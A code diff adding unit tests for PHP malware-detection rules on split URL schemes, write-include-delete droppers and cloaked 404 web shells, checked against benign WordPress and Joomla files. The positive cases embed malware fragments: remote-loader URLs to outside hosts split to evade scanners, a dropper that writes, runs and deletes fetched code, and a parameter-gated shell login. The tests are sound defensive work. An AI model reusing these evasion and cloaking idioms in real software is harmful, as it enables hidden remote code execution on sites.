@@ -1527,6 +1527,184 @@ TEST(RepairedRuleTest, SubstitutionCipherIsNotValidationOrAPlainCodec) {
     EXPECT_FALSE(ruleFires("OBF039", shortRun));
 }
 
+// OBF040: the cut has to fall inside the scheme WORD, not at its punctuation.
+//
+// Every negative below is a real file. Splitting a URL across concatenated literals
+// is ordinary - 208 files in the CMS, CMS-ext and Sites trees do it - so the rule
+// would be worthless without the condition these three pin down.
+TEST(RepairedRuleTest, SplitUrlSchemeIsNotAWrappedLineOrAnEscapedTag) {
+    // The remote-loader family, three spellings of the same cut.
+    EXPECT_TRUE(ruleFires("OBF040",
+        "<?php $code = GC('htt'.'ps://c.by'.'a61.xy'.'z/');"));
+    EXPECT_TRUE(ruleFires("OBF040",
+        "<?php $code = GC('ht'.'tps://5'.'1la.zv'.'o2.x'.'yz/a1.t'.'xt');"));
+    // One character per literal, which is the same technique taken to its limit.
+    EXPECT_TRUE(ruleFires("OBF040",
+        "<?php $_u = 'h' . 't' . 't' . 'p' . 's' . ':' . '/' . '/' . 'r' . 'a' . 'w' "
+        ". '.' . 'g' . 'i' . 't' . 'h' . 'u' . 'b';"));
+
+    // w3-total-cache's Minify/Packer.php, wrapping a long trigger_error message. This
+    // is the ONLY file in 107,727 that splits a scheme at all, and it breaks at the
+    // colon - where a URL reads as having a seam - not between two letters.
+    EXPECT_FALSE(ruleFires("OBF040",
+        "<?php\n"
+        "trigger_error(\n"
+        "    'The script \"class.JavaScriptPacker.php\" is required. Please see: http:'\n"
+        "    .'//code.google.com/p/minify/source/browse/trunk/min/lib/JSMin.php'\n"
+        ");\n"));
+
+    // wp-super-cache's inc/htaccess.php, and Magento's InitialConfigSourceTest.php in
+    // the same idiom: splitting the PHP tag so the source does not contain one. This
+    // is why the rule was NOT extended to a split `<?php` - three of the four benign
+    // files that split any marker do exactly this, and the malware's own
+    // `'<'.'?p'.'hp'` is indistinguishable from it.
+    EXPECT_FALSE(ruleFires("OBF040",
+        "<?php\n"
+        "file_put_contents( $backup_filename, \"<\" . \"?php die(); ?\" . \">\" . $body );\n"));
+    EXPECT_FALSE(ruleFires("OBF040",
+        "<?php\n$this->write( $path, \"<?\" . \"php\\n return [];\\n\" );\n"));
+
+    // An ordinary assembled URL: concatenated literals, scheme written whole. This is
+    // the shape all 208 of the measured files have.
+    EXPECT_FALSE(ruleFires("OBF040",
+        "<?php $api = 'https://api.example.com/v2/' . 'accounts/' . $id . '/settings';"));
+}
+
+// RCE015: written, executed, then deleted - and in that order, close together.
+//
+// The negatives are the three benign files that come closest. All nine files in the
+// measured trees that put one variable through both an include and an unlink are
+// this shape: the delete is housekeeping somewhere else in the file, and the
+// included path is one the code never wrote.
+TEST(RepairedRuleTest, IncludeAndDeleteNeedsTheWriteAndTheOrder) {
+    // The remote loader, ASCII-named.
+    EXPECT_TRUE(ruleFires("RCE015",
+        "<?php\n"
+        "$file_path = '.c';\n"
+        "file_put_contents($file_path, $code);\n"
+        "@require($file_path);\n"
+        "fclose($file_name);\n"
+        "@unlink($file_path);\n"));
+    // The same shell shipped with the variable named in katakana. A `\\w`-based
+    // pattern matches the first and silently misses this one.
+    EXPECT_TRUE(ruleFires("RCE015",
+        "<?php\n"
+        "$\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4\xe3\x83\xab\xe3\x83\x91\xe3\x82\xb9 = '.c';\n"
+        "file_put_contents($\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4\xe3\x83\xab\xe3\x83\x91\xe3\x82\xb9, $code);\n"
+        "@require($\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4\xe3\x83\xab\xe3\x83\x91\xe3\x82\xb9);\n"
+        "@unlink($\xe3\x83\x95\xe3\x82\xa1\xe3\x82\xa4\xe3\x83\xab\xe3\x83\x91\xe3\x82\xb9);\n"));
+
+    // Joomla's com_joomlaupdate/extract.php. The unlink is 349 bytes away - inside the
+    // 400-byte window - but on the wrong side of the include, and `$filename` is a
+    // file the updater ships, not one it wrote. This is the tightest benign pair
+    // measured, and it fails on direction.
+    EXPECT_FALSE(ruleFires("RCE015",
+        "<?php\n"
+        "$filename = __DIR__ . '/finalisation.php';\n"
+        "@unlink($filename);\n"
+        "clearFileInOPCache($basePath . 'update.php');\n"
+        "if (file_exists($filename)) {\n"
+        "    clearFileInOPCache($filename);\n"
+        "    include_once $filename;\n"
+        "}\n"
+        "file_put_contents($logFile, $message);\n"));
+
+    // OceanWP's theme panel: `include_once $file;` in one method, `unlink($file);` in
+    // another 10,738 bytes later. The window is what excludes it, and 10,738 against
+    // 400 is why 400 is not a tuned number.
+    {
+        std::string oceanwp =
+            "<?php\n"
+            "$file = OCEANWP_THEME_PANEL_DIR . '/views/panes/plugin-upgrade-info.php';\n"
+            "if ( file_exists( $file ) ) {\n"
+            "    include_once $file;\n"
+            "    return;\n"
+            "}\n";
+        oceanwp.append(600, ' ');
+        oceanwp += "\nfunction oceanwp_remove_temp( $file ) {\n"
+                   "    file_put_contents( $file, '' );\n"
+                   "    unlink($file);\n"
+                   "}\n";
+        EXPECT_FALSE(ruleFires("RCE015", oceanwp));
+    }
+
+    // wp-super-cache's inc/lifecycle.php: the config file is required after being
+    // rewritten line by line, and the unlink of it lives in the uninstall path 1,881
+    // bytes earlier. Nothing ever passes it to file_put_contents.
+    EXPECT_FALSE(ruleFires("RCE015",
+        "<?php\n"
+        "unlink( $wp_cache_config_file );\n"
+        "wp_cache_replace_line('sem_id', '$sem_id = ' . $sem_id . ';', $wp_cache_config_file);\n"
+        "if ( $new ) {\n"
+        "    require($wp_cache_config_file);\n"
+        "    wpsc_set_default_gc( true );\n"
+        "}\n"
+        "file_put_contents( $wpsc_advanced_cache_filename, $lines );\n"));
+}
+
+// WS010: what the 404 is gated on decides whether it is a cloak.
+//
+// The three negatives are every distinct piece of benign code that reaches a
+// 404-then-stop in the measured trees: WordPress core's multisite file server, twice,
+// and Jetpack's uninstall guard. All three answer honestly about a resource; the
+// malware answers about itself.
+TEST(RepairedRuleTest, Cloaked404NeedsAParameterGateNotAStateCheck) {
+    // The shell: present for whoever knows `520`, absent for everyone else.
+    EXPECT_TRUE(ruleFires("WS010",
+        "<?php\n"
+        "if (!$pass) {\n"
+        "    if(!isset($_REQUEST['520'])) {\n"
+        "        header(\"HTTP/1.1 404 Not Found\");\n"
+        "        die();\n"
+        "    }\n"
+        "    echo '<form action=\"#\" method=\"post\">"
+        "<input type=\"password\" name=\"p8\"></form>';\n"
+        "}\n"));
+
+    // WordPress core wp-includes/ms-files.php. Note `$_GET['file']` sits 30 bytes
+    // before the guard and well inside the backward window - the rule does not fire
+    // because the negated test is `is_file`, a fact about the resource, and its
+    // argument is `$file` rather than the superglobal.
+    EXPECT_FALSE(ruleFires("WS010",
+        "<?php\n"
+        "$file = rtrim( BLOGUPLOADDIR, '/' ) . '/' . str_replace( '..', '', $_GET['file'] );\n"
+        "if ( ! is_file( $file ) ) {\n"
+        "    status_header( 404 );\n"
+        "    die( '404 &#8212; File not found.' );\n"
+        "}\n"));
+
+    // The same file's multisite check, on blog state.
+    EXPECT_FALSE(ruleFires("WS010",
+        "<?php\n"
+        "ms_file_constants();\n"
+        "if ( '1' === $current_blog->archived || '1' === $current_blog->spam "
+        "|| '1' === $current_blog->deleted ) {\n"
+        "    status_header( 404 );\n"
+        "    die( '404 &#8212; File not found.' );\n"
+        "}\n"));
+
+    // Jetpack's uninstall.php, refusing to run outside the uninstall hook.
+    EXPECT_FALSE(ruleFires("WS010",
+        "<?php\n"
+        "if (\n"
+        "    ! defined( 'WP_UNINSTALL_PLUGIN' ) ||\n"
+        "    ! WP_UNINSTALL_PLUGIN ||\n"
+        "    dirname( WP_UNINSTALL_PLUGIN ) !== dirname( plugin_basename( __FILE__ ) )\n"
+        ") {\n"
+        "    status_header( 404 );\n"
+        "    exit( 0 );\n"
+        "}\n"));
+
+    // Polarity: `!empty` was in the test list for one draft. It is backwards - it
+    // makes the 404 the answer when the parameter IS present, which hides nothing.
+    EXPECT_FALSE(ruleFires("WS010",
+        "<?php\n"
+        "if ( ! empty( $_GET['debug'] ) ) {\n"
+        "    header( 'HTTP/1.1 404 Not Found' );\n"
+        "    exit;\n"
+        "}\n"));
+}
+
 // OBF038: "wordless" alone matched banner rules and docblock fragments.
 TEST(RepairedRuleTest, NoiseCommentsAreNotBannersOrDocblocks) {
     // WordPress core view.js style banner separators.
